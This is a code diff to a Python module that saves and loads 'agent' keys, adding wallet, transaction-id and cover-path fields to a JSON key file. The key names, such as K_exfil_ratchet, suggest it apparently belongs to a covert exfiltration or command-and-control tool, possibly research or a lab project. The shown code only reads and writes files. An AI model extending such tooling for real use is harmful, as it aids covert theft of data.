@@ -62,13 +62,34 @@ def server_load_server_keys(keyfile_path):
 #Agent side functions
 
 #saves agent keys to keyfile
-def agent_save_agent_keys(keyfile_path, K_ratchet, K_exfil_ratchet, K_extract):
+def agent_save_agent_keys(keyfile_path, K_ratchet, K_exfil_ratchet, K_extract,
+                           server_wallet=None, last_seen_txid=None, cover_path=None):
+    #Load existing keyfile to preserve fields not passed in
+    existing = {}
+    if os.path.exists(keyfile_path):
+        try:
+            with open(keyfile_path, "r") as f:
+                existing = json.load(f)
+        except (json.JSONDecodeError, OSError):
+            existing = {}
+
     #Saves agent keys to temp dict
     agent_keys = {
         "K_ratchet": K_ratchet.hex(),
         "K_exfil_ratchet": K_exfil_ratchet.hex(),
         "K_extract": K_extract.hex(),
+        "server_wallet": existing.get("server_wallet", ""),
+        "last_seen_txid": existing.get("last_seen_txid", ""),
+        "cover_path": existing.get("cover_path", ""),
     }
+
+    #Override with explicitly-provided runtime/provisioning values
+    if server_wallet is not None:
+        agent_keys["server_wallet"] = server_wallet
+    if last_seen_txid is not None:
+        agent_keys["last_seen_txid"] = last_seen_txid
+    if cover_path is not None:
+        agent_keys["cover_path"] = cover_path
 
     #saves agent keys to keyfile
     with open(keyfile_path, "w") as f:
@@ -83,6 +104,9 @@ def agent_load_agent_keys(keyfile_path):
             K_ratchet = bytes.fromhex(data["K_ratchet"])
             K_exfil_ratchet = bytes.fromhex(data["K_exfil_ratchet"])
             K_extract = bytes.fromhex(data["K_extract"])
+            server_wallet = data.get("server_wallet", "")
+            last_seen_txid = data.get("last_seen_txid", "")
+            cover_path = data.get("cover_path", "")
     #if keyfile isnt found
     except FileNotFoundError:
         raise FileNotFoundError("Keyfile Not Found")
@@ -92,6 +116,9 @@ def agent_load_agent_keys(keyfile_path):
         "K_ratchet": K_ratchet,
         "K_exfil_ratchet": K_exfil_ratchet,
         "K_extract": K_extract,
+        "server_wallet": server_wallet,
+        "last_seen_txid": last_seen_txid,
+        "cover_path": cover_path,
     }
 
     return agent_keys
